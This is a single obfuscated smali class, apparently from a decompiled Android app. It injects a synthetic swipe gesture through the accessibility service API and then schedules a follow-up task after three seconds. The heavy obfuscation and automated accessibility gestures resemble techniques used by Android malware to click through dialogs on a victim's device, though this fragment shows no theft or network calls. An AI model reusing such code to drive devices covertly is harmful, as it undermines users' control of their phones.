.class Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a;->e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result v0

    int-to-float v0, v0

    const v1, 0x3f733333    # 0.95f

    mul-float/2addr v0, v1

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v1

    int-to-float v1, v1

    const v3, 0x3f19999a    # 0.6f

    mul-float/2addr v3, v1

    invoke-virtual {v2, v0, v3}, Landroid/graphics/Path;->moveTo(FF)V

    const v3, 0x3f666666    # 0.9f

    mul-float/2addr v1, v3

    invoke-virtual {v2, v0, v1}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v3, 0x1

    const-wide/16 v5, 0x1f4

    const/4 v7, 0x0

    invoke-static/range {v2 .. v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a$a;

    invoke-direct {v2, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a;)V

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->f(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Landroid/accessibilityservice/GestureDescription;Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;)V

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a$b;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a$b;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d$a$a;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
